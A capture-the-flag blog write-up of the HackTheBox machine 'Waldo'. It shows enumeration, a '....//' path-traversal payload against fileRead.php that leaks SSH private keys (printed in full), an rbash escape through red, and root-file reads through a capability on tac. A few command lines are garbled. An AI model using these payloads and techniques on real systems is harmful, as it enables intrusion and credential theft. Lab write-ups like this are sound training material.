---
layout: post
title: Hackthebox Waldo Writeup
---

## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Waldo" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.87 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-14 08:55 EEST
Nmap scan report for 10.10.10.87
Host is up (0.046s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.79 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.87/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.87/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2018/09/14 08:58:10 Starting gobuster
=====================================================
2018/09/14 08:58:10 [-] Wildcard response found: http://10.10.10.87/e113ab7b-ef12-44fe-b1c0-effad3af0c0b => 302
2018/09/14 08:58:10 [!] To force processing of Wildcard responses, specify the '-fw' switch.
=====================================================
2018/09/14 08:58:10 Finished
=====================================================
{% endhighlight %}

### 2.Getting User
Sounds like an interesting web page is running on the server.
![placeholder](https://inar1.github.io/public/images/2019-02-19-22-02-37.png)

By inspecting with chrome development tool, we can find that it is html web page and controlled by "list.js".

![placeholder](https://inar1.github.io/public/images/2019-02-19-19-43-01.png)

In that file, there are some interesting php path in some functions.

{% highlight shell %}
root@kali:/home/sabonawa# curl -i http://10.10.10.87/list.js
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 18 Sep 2018 21:34:34 GMT
Content-Type: application/javascript
Content-Length: 6245
Last-Modified: Thu, 03 May 2018 20:48:36 GMT
Connection: keep-alive
ETag: "5aeb75a4-1865"
Expires: Sun, 23 Sep 2018 21:34:34 GMT
Cache-Control: max-age=432000
Accept-Ranges: bytes

~~~

function readDir(path){ 
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST","dirRead.php",false);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send('path=' + path);
	if (xhttp.readyState === 4 && xhttp.status === 200) {
		return xhttp.responseText;
	}else{
	}
}


function readFile(file){ 
	var xhttp = new XMLHttpRequest();
	xhttp.open("POST","fileRead.php",false);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send('file=' + file);
	if (xhttp.readyState === 4 && xhttp.status === 200) {
		return xhttp.responseText;
	}else{
	}
}

~~~

{% endhighlight %}

For instance, dirRead.php has Directory Traversal(?).<br>
Which means we can see any directory on Waldo if we have a permission.
{% highlight shell %}
root@kali:~# curl -i -X POST http://10.10.10.87/dirRead.p "Content-Type: application/x-www-form-urlencoded" -d "path=./" 
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 18 Sep 2018 21:55:09 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.1.16

[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
{% endhighlight %}

In addition, by taking advantage of fileRead.php, we can achieve one private key of private key for user nobody.

{% highlight shell %}
root@kali:/homefileRead.php -H "Content-Type: application/x-www-form-urlencoded" -d "file=....//....//....//home/nobody/.ssh/.monitor"
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Tue, 18 Sep 2018 23:20:03 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.1.16

{"file":"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl\nmR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f\n87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS\ndGCc\/gNpW\/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN\no8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8\/6pceowqs9ujRkNzH9T1lJq4Fx1V\nvi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl\/wdmuPEW6kU\nvmzhRU3gcjuzwBET0TNejbL\/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR\/6\npKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5\n8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q\n1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox\/05qoOBL4kQxUM7\nVxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS\ndVa3yLECgYEA7jk51MvUGSIFF6GkXsNb\/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO\nv0og0X\/iROXAcp6Z9WGpIc6FhVgJd\/4bNlTR+A\/lWQwFt1b6l03xdsyaIyIWi9xr\nxsb2sLNWP56A\/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY\nqFfdAWrvVZjp26Yf\/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI\nyzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1\n\/pAcw\/+\/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw\/IMnLa3drm3CIAa32iU\nLRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ\/\nlnN2n1WyTIyEuGA\/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp\nw7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9\n1HLmBkDTjjj\/xAJAZuiOF4Rs\/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT\nrj1BhUCzZCUgQABtpC6vYj\/HLLlzpiC05AIEhDdvToPK\/0WuY64fds0VccAYmMDr\nX\/PlAoGAS6UhbCm5TWZhtL\/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2\nDvVny8gKbM\/OenwHnTlwRTEj5qdeAM40oj\/mwCDc6kpV1lJXrW2R5mCH9zgbNFla\nW0iKCBU
{% endhighlight %}

we can use it by command "ssh -i"

{% highlight shell %}
root@kali:~# ssh nobody@10.10.10.87 -i private_key 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.

waldo:~$ cat user.txt
32768bcd7513275e085fd4e7b63e9d24
{% endhighlight %}

### 3.Getting root
We can find an interesting private key file in /home/monitor/.ssh 
{% highlight shell %}
waldo:~/.ssh$ cat .monitor 
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
{% endhighlight %}

By following command, we can get out of docker container as user "monitor".

{% highlight shell %}
waldo:~/.ssh$ ssh monitor@localhost -i .monitor
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1

~~~

-rbash: alias: command not found
monitor@waldo:~$ 
{% endhighlight %}

Without doing something, even we can not do "cd".<br>
To bypass restricted shell, we can take advantage of red command.

{% highlight shell %}
monitor@waldo:~$ cd ../
-rbash: cd: restricted
monitor@waldo:~$ red
!'/bin/sh'
$ cd /
$ ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
$ 
{% endhighlight %}

Then, we can find a file which has weak permission (capability).

{% highlight shell %}
$ /sbin/getcap -r / 2>/dev/null        
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
{% endhighlight %}

We found tac command.<br>
Finally, what we have to do is specify full path of tac command and root.txt

{% highlight shell %}
$ /usr/bin/tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6c
{% endhighlight %}
